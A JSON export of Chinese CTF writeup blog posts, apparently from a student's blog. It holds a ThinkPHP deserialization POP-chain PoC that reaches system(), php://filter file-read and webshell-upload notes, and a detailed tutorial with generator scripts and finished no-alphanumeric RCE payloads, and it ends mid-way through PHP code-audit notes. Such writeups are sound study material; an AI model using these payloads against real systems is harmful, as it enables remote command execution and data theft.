[{"title":"CISCN2022初赛","url":"/2023/05/08/CISCN2022%E5%88%9D%E8%B5%9B/","content":"[CISCN 2022 初赛]ezpop扫描出了www.zip\n然后有了thinkphp的框架目录\n然后题目告诉我们thinkphp的版本直接找网上的poc\nhttps://xz.aliyun.com/t/11584\n&lt;?php// 保证命名空间的一致namespace think &#123;    // Model需要是抽象类    abstract class Model &#123;        // 需要用到的关键字        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        // 初始化        public function __construct($obj=&#x27;&#x27;) &#123;            $this-&gt;lazySave = true;            $this-&gt;data = [&#x27;whoami&#x27;=&gt;[&#x27;whoami&#x27;]];//这里修改一下为 ls /*            $this-&gt;exists = true;            $this-&gt;table = $obj;    // 触发__toString            $this-&gt;withAttr = [&#x27;whoami&#x27;=&gt;[&#x27;system&#x27;]];            $this-&gt;json = [&#x27;whoami&#x27;];            $this-&gt;jsonAssoc = true;        &#125;    &#125;&#125;namespace think\\model &#123;    use think\\Model;    class Pivot extends Model &#123;    &#125;    // 实例化    $p = new Pivot(new Pivot());    echo urlencode(serialize($p));&#125;\n\n\n\n\n[CISCN 2022 华东南]web1无环境，写屁\n[CISCN 2022 华东南]xxcloud写不出\n罢了复现不了\n","categories":["writeups"],"tags":["thinkphp","反序列化"]},{"title":"HNCTF 2022 week1 Writeup","url":"/2023/05/05/HNCTF2022Week1%E9%83%A8%E5%88%86wp/","content":"[HNCTF 2022 Week1]easy_html\n看看cookie\n\n\n有个框框，来我们猜猜是什么?xss ,ssti,sql?\n\n但是我发现这里好像只有10个位置，我的思路第一时间想到1到9999999999爆破。经过我的不断尝试，发现，我是呆逼\n手机号怎么可能只有10位呢。\n\n随便修改前端为超过10的数，然后输入10个以上的数就ok了\n亏得我电脑风扇还飞了起来\n\n[HNCTF 2022 Week1]Interesting_include\n读题就是过滤了大小写flag\n这种直接用过滤器，因为正则匹配都是匹配字符，而过滤器传递的是路径当攻击者使用php://filter/read=convert.base64-encode/resource=flag.php作为filter参数时，PHP解析器会将这个参数作为一个文件路径，传递给include函数。因为这个参数不是一个标准的文件路径，而是一个流过滤器，因此在执行include函数时，会先对这个参数进行处理，将flag.php文件的内容转换为base64编码，再输出到标准输出流中。\n\n[HNCTF 2022 Week1]easy_upload基础中的基础，直接改后缀名为php，蚁剑连接根目录一看就有了\n[HNCTF 2022 Week1]Interesting_http一开始叫我们post一个want\n按他说的做\n\n然后想要啥flag\n\n肯定没那么简单\n这种不是管理员一般看看cookie\n\n改改\n\nxff改改\n\n[HNCTF 2022 Week1]Challenge__rce\n传个hint试试\n\n一眼顶真\n\n无字符rce\n一直有接触但是没有系统学习，这里来一波。\n\n参考：https://xz.aliyun.com/t/8107\n\n最简单的无字符过滤\n&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;  eval($_GET[&#x27;shell&#x27;]);&#125;\n\n研究这段代码的绕过\n异或我们先从异或看起\n\n输出是’o’，我们来分析下原因,5的ASCII码是53,转成二进制是00110101,Z的ASCII码是90,转成二进制是01011010,将他们进行异或,为,也即十进制的111,为o\n\n再学习一下这段代码\n刚刚讲过’5’^’Z’为’o’\n这样我们就将$__赋值为’o’然后php允许把字符串当函数用。这样我们就成功的调用了o()这个函数\n$_是一个没有定义过的变量，php会给他赋一个默认值NULL&#x3D;&#x3D;0\n那么这个1就不难理解了\n\n取反\n先用python输出一个字符的utf8编码\n\n输出了一手rr，emmmm，为什么呢？\n\n还记得我们的python输出了什么吗\n\\xe5\\x8d\\xa2\n我们定义一个变量$_等于卢，里面有三个字节，取1就是第二个，\\x8d\n这样就可以得到一个ascii码字符\n总之我们就需要知道，对于一个汉字进行($x{0})或($x{1})或~($x{2})的操作，可以得到某个ASCII码的字符值\n一个版本问题PHP5中有一个函数是assert()，这是一个断言函数，用于测试阶段进行判断条件\n可以在php5里面这么用\n$_&#x3D;assert;\n$_()\n就是这么用，对这么用\n\n但是在php7及以上不行了。但是有别的方法\n\nPHP5中，是不支持($a)()这种调用方法的，但在PHP7中支持这种调用方法，因此支持这么写(‘phpinfo’)();\n\nphp中的短标签1.\n这个相当与&lt;?php&gt;\n2.\n这个相当&lt;?echo&gt;\n举个例子\n\n\n\nok的喔\n大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，这种写法总是适用的，这种写法则需要short_open_tag开启才行。\n所以还是需要注意一些版本问题\nphp中的反引号反引号可以当命令执行用知道吧，很常见的一个姿势\n&lt;?php$_=`whoami`;echo $_;\n\n\n结合上面的短标签就可以这么写\n\n效果是一样的\n好了前置知识结束，相信你和我一样觉得这些东西零零碎碎，没什么用接下来进入实操\n\n异或实操&lt;?php$shell = &quot;assert&quot;;$result1 = &quot;&quot;;$result2 = &quot;&quot;;for($num=0;$num&lt;=strlen($shell);$num++)&#123;    for($x=33;$x&lt;=126;$x++)    &#123;        if(judge(chr($x)))        &#123;            for($y=33;$y&lt;=126;$y++)            &#123;                if(judge(chr($y)))                &#123;                    $f = chr($x)^chr($y);                    if($f == $shell[$num])                    &#123;                        $result1 .= chr($x);                        $result2 .= chr($y);                        break 2;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;echo $result1;echo &quot;  &quot;;echo $result2;function judge($c)&#123;    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))    &#123;        return true;    &#125;    return false;&#125;\n\n来理解理解吧\n还记的异或吗，我们需要得到一个可见函数，就是一个一个得到其中的字母或者数字，我们可以用循环异或非字母或者数字的方式的方式得到这个函数\n注意一个比较少用的语法，break 2，就是跳出两层循环\n\n取反实操&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;;function mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;for ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这个取反是有点难度的，我们仔细看看\n\n$shell = &quot;assert&quot;;$result = &quot;&quot;;$arr =array();$word\n\n这几个可以当变量，$word太长了我不写了看起来不舒服\nfunction mb_str_split( $string ) &#123;    return preg_split(&#x27;/(?&lt;!^)(?!$)/u&#x27;, $string ); &#125;foreach (mb_str_split($word) as $c)&#123;    $arr[] = $c;&#125;\n\n这两个我们放一块看看，前者是一个函数，是一个回溯匹配。其实我是看不懂的，只能看到前半部分有^这个是开头我知道，后者有$是结尾。感觉是对开头结尾进行的操作\n看看chatgpt怎么说\n(?&lt;!^): 这是一个负向回溯断言，用于匹配不在字符串开头的位置。其中 (?&lt;!...) 表示负向回溯断言，^ 表示字符串的开头。因此 (?&lt;!^) 就是匹配不在字符串开头的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n(?!$): 这是一个负向预测断言，用于匹配不在字符串结尾的位置。其中 (?!...) 表示负向预测断言，$ 表示字符串的结尾。因此 (?!$) 就是匹配不在字符串结尾的位置。这个断言的作用是确保只有在两个字符之间的位置才能进行分割。\n大概是能理解了\n后面就是对我们的$word的这个字符库进行遍历，赋值给数组。\n为什么后面就知道了\nfor ($x=0;$x&lt;strlen($shell);$x++)&#123;    for ($y=0;$y&lt;count($arr);$y++)    &#123;        $k = $arr[$y];        if ($shell[$x] == ~($k&#123;1&#125;))        &#123;            $result .= $k;            break;        &#125;    &#125;&#125;echo $result;\n\n这里对我们的$shell进行遍历循环，其实思路都是一样的。匹配相等的。我们对\n$shell[$x] &#x3D;&#x3D; ~($k{1})这个进行判断。\n就可以了\n最后出来的结果\n\n还记得之前我们学习的取反知识点吗？\n一个字符可以分成三个字节。\n&lt;?php$_++;   //得到1，此时$_=1$__ = &quot;极&quot;;$___ = ~($__&#123;$_&#125;);   //得到a，此时$___=&quot;a&quot;$__ = &quot;区&quot;;$___ .= ~($__&#123;$_&#125;);   //得到s，此时$___=&quot;as&quot;$___ .= ~($__&#123;$_&#125;);   //此时$___=&quot;ass&quot;$__ = &quot;皮&quot;;$___ .= ~($__&#123;$_&#125;);   //得到e，此时$___=&quot;asse&quot;$__ = &quot;十&quot;;$___ .= ~($__&#123;$_&#125;);   //得到r，此时$___=&quot;asser&quot;$__ = &quot;勺&quot;;$___ .= ~($__&#123;$_&#125;);   //得到t，此时$___=&quot;assert&quot;$____ = &#x27;_&#x27;;   //$____=&#x27;_&#x27;$__ = &quot;寸&quot;;$____ .= ~($__&#123;$_&#125;);   //得到P，此时$____=&quot;_P&quot;$__ = &quot;小&quot;;$____ .= ~($__&#123;$_&#125;);   //得到O，此时$____=&quot;_PO&quot;$__ = &quot;欠&quot;;$____ .= ~($__&#123;$_&#125;);   //得到S，此时$____=&quot;_POS&quot;$__ = &quot;立&quot;;$____ .= ~($__&#123;$_&#125;);   //得到T，此时$____=&quot;_POST&quot;$_ = $$____;   //$_ = $_POST$___($_[_]);   //assert($_POST[_])\n\n\n大概需要理解这个思路和操作\n一个plusdef get(shell):    hexbit=&#x27;&#x27;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))    hexbit = hexbit.replace(&#x27;0x&#x27;,&#x27;%&#x27;)    print(hexbit)get(&#x27;assert&#x27;)get(&#x27;_POST&#x27;)\n\n首先，map() 函数将传入的 lambda 匿名函数应用到 shell 字符串中的每个字符上。lambda 函数接受一个字符参数 x，并执行以下操作：\n\nord(x)：将字符 x 转换为其对应的 ASCII 码值。\n-(256-ord(x))：将 ASCII 码值减去 256，得到一个负整数。\n~(-(256-ord(x)))：将该负整数按位取反，得到其补码表示的正整数。\nhex(~(-(256-ord(x))))：将该正整数转换为十六进制字符串表示。\n\n因此，map() 函数返回一个字符串列表，其中每个字符串表示 shell 字符串中的一个字符的 URL 编码的十六进制字符串。\n接着，&#39;&#39;.join() 函数将该字符串列表中的所有字符串连接起来，生成一个整个字符串的 URL 编码的十六进制字符串。\n最后，将该字符串中的所有 ‘0x’ 替换为 ‘%’，得到最终的 URL 编码字符串。\n&lt;?php$_ = ~&quot;%9e%8c%8c%9a%8d%8b&quot;;   //得到assert，此时$_=&quot;assert&quot;$__ = ~&quot;%a0%af%b0%ac%ab&quot;;   //得到_POST，此时$__=&quot;_POST&quot;$___ = $$__;   //$___=$_POST$_($___[_]);   //assert($_POST[_])\n\n自增自减&quot;A&quot;++ ==&gt; &quot;B&quot;&quot;B&quot;++ ==&gt; &quot;C&quot;\n\n这个能理解吧\n一个很简单的思想，能得到一个字符，所有字符都可以通过自增自减得到\n根据上面的知识总结，我们看看这道题怎么写\n\n重新看看题目\n测试一下那些字符可以使用\n\n&lt;?phpfor($i=32;$i&lt;127;$i++)&#123;    if (!preg_match(&quot;/[!@#%^&amp;*:&#x27;\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, chr($i))) &#123;        echo chr($i);    &#125;&#125;\n\n可用字符有这些\n$()+,.0123456789;=[]_&#123;&#125;\n\n这里可以有字符我们就利用自增方式来玩\n&lt;?php$__=_.[];   //$__=_Array$_=$__[4];  //$_=a$_++;   //$_=b$_0=++$_;   //$_0=$_=c$_++;   //$_=d$_++;   //$_=e$_++;   //$_=f$_++;   //$_=g$_=$_0.++$_.$__[3];     //$_0=c;++$_=h;$__[3]=r$_=_.$_(71).$_(69).$_(84);  //$_=_.G.E.T=_GET$$_[_]($$_[__]);    //$_GET[_]($_GET[__])?&gt;\n\n$__=_.[];$_=$__[4];$_++;$_0=++$_;$_++;$_++;$_++;$_++;$_=$_0.++$_.$__[3];$_=_.$_(71).$_(69).$_(84);$$_[_]($$_[__]);\n\n注意还有最后一点\npost传参时需要将payload进行urlencode\nget传参 ?_=system&amp;__=ls /\nok\n思路是这样的但是这个payload我不知道为什么不可以\n换一个\n$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);GET?1=system&amp;2=lsPOSTrce=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B\n\n\n","categories":["writeups"],"tags":["html","无字符rce","文件上传","文件包含","cookie"]},{"title":"hgame-week1","url":"/2023/05/11/hgame-week1/","content":"[HGAME 2023 week1]Classic Childhood Game","categories":["writeups"],"tags":["thinkphp","反序列化"]},{"title":"php_bugs-master-1到5","url":"/2023/05/09/php-bugs-master-1%E5%88%B05/","content":"前言代码审计得从基础做起。今天逛github找到了一个看起来还不错的项目php_bugs。star还是挺多的学习一下\n环境搭建问题想要可以有web in server。phpstorm本身我没有跑起来，有个简单方法，可以放到phpstudy里面跑起来。这个实测是很简单的。\n01 extract变量覆盖.php&lt;?phperror_reporting(0);$flag=&#x27;xxx&#x27;; extract($_GET); if(isset($shiyan)) &#123;     $content=trim(file_get_contents($flag));    if($shiyan==$content)    &#123;         echo&#x27;ctf&#123;xxx&#125;&#x27;;     &#125;   else   &#123;     echo&#x27;Oh.no&#x27;;   &#125;    &#125;?&gt;\n\nextract函数得看看是什么\n\nextract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。\n好像很不太懂，感觉就是把值赋给变量巴拉巴拉\n这里举个例子\n\n大概是可以理解了\n也就是说我们通过$GET传参，对应的参数和值会被当作数组，然后就可以啊吧啊吧\n\n进入这个if，emmmm\n不传值就好了，可是有小可爱会问。不传值，isset怎么半\n在PHP中，null和空是两个不同的概念。\n\n看看我传的参\n再看看我修改的源码\n\n我们想要flag，很简单，flag变量随便输入，因为我们没有文件\n结束\nextract()会将$flag和$shiyan的值覆盖了，将变量的值设置为空或者不存在的文件就满足$shiyan== $content。\n02 绕过过滤的空白字符&lt;?php $info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;; ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值error_reporting(0); //关闭所有PHP错误报告 if(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125; foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125;   function is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125;   if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;else&#123;      $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));        if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;     else     &#123;           if(is_palindrome_number($req[&quot;number&quot;]))&#123;              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;;           &#125;          else          &#123;             $info=$flag;          &#125;     &#125; &#125; echo $info;\n\n慢慢看吧有点长\nif(!isset($_GET[&#x27;number&#x27;]))&#123;   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt    die(&quot;have a fun!!&quot;); //die — 等同于 exit() &#125;\n\n这里就是用来检测有没有number这个参数\n不然给你一个hint然后让你die\nforeach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式     foreach($global_var as $key =&gt; $value) &#123;         $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串    &#125; &#125; 